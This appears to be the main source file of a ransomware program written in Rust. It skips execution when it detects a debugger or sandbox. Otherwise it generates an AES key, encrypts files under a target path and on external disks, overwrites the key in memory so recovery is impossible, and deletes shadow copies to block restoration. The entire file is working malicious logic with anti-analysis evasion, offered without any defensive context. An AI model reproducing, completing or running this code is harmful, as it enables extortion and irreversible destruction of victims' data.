mod encryption;
mod system;

use std::{env, process::exit};
fn main() {
    let args: Vec<String> = env::args().collect();
    if args.len() < 2 {
        println!("Missing Arguments");
        exit(-1)
    }

    if !system::sandbox::is_debugger_detected() && !system::sandbox::is_sandbox_detected() {
        let mut key = encryption::file::gen_aes_key(32);

        encryption::file::multi_threaded_encrypt_decrypt_files(&args[1][..], key.as_bytes());
        encryption::disk::encrypt_decrypt_external_disks(key.as_bytes());

        unsafe {
            for key_char in key.as_mut_vec() {
                *key_char = 48;
            }
        }
        //println!("{}", key);

        system::file::delete_shadow_copies();
    }

    exit(0);
}
